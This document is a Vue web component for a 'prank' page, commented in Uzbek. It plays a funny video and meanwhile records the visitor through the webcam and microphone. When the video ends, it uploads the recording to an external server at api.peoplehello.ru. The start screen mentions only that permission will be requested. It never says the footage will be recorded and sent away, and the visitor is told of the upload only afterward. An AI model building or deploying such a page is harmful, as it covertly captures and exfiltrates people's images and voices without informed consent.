<script>
import axios from "axios"

export default {
  data() {
    return {
      stream: null,
      mediaRecorder: null,
      recordedChunks: [],
      started: false,
      recording: false,
    }
  },

  methods: {
    // 🔑 FAOL USER ACTION
    async startPrank() {
      try {
        this.started = true

        // 1️⃣ Kamera + mikrofon ruxsati
        this.stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: true
        })

        // 2️⃣ Recording boshlanadi
        this.startRecording()

      } catch (e) {
        console.error('Permission error:', e)
        alert('❌ Kamera yoki mikrofon ruxsati berilmadi')
      }
    },

    startRecording() {
      this.recordedChunks = []

      // 🔻 Optimal bitrate (kichik hajm, sifat OK)

      alert(window.MediaRecorder)
      this.mediaRecorder = new MediaRecorder(this.stream, {
        mimeType: 'video/webm;codecs=vp8,opus',
        videoBitsPerSecond: 700_000
      })

      this.mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          this.recordedChunks.push(e.data)
        }
      }

      this.mediaRecorder.start()
      this.recording = true
    },

    async stopRecordingAndSend() {
      if (!this.recording) return

      this.mediaRecorder.stop()
      this.recording = false

      this.mediaRecorder.onstop = async () => {
        const blob = new Blob(this.recordedChunks, { type: 'video/webm' })

        const formData = new FormData()
        formData.append('file', blob)

        try {
          await axios.post(
              'https://api.peoplehello.ru/api/video-upload',
              formData
          )
          alert('😂 Video muvaffaqiyatli yuborildi!')
        } catch (e) {
          alert('❌ Video yuborilmadi')
        }
      }
    },

    // 🎬 Kulgili video tugaganda
    onFunnyVideoEnd() {
      this.stopRecordingAndSend()
    }
  }
}
</script>


<template>
  <div class="prank-page">

    <!-- START SCREEN (MUHIM) -->
    <div v-if="!started" class="start-screen">
      <button @click="startPrank">
        ▶️ Videoni boshlash
      </button>
      <p>Kamera va mikrofon ruxsati so‘raladi</p>
    </div>

    <!-- PRANK VIDEO -->
    <video
        v-else
        class="fun-video"
        autoplay
        playsinline
        muted
        @ended="onFunnyVideoEnd"
    >
      <source src="../assets/prank.mp4" type="video/mp4" />
    </video>

  </div>
</template>



<style>
.prank-page {
  width: 100vw;
  height: 100vh;
  background: #000;
}

.start-screen {
  width: 100%;
  height: 100%;
  color: #fff;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}

.start-screen button {
  padding: 16px 30px;
  font-size: 18px;
  border-radius: 12px;
  border: none;
  cursor: pointer;
}

.fun-video {
  width: 100%;
  height: 100%;
  object-fit: cover;
}


</style>
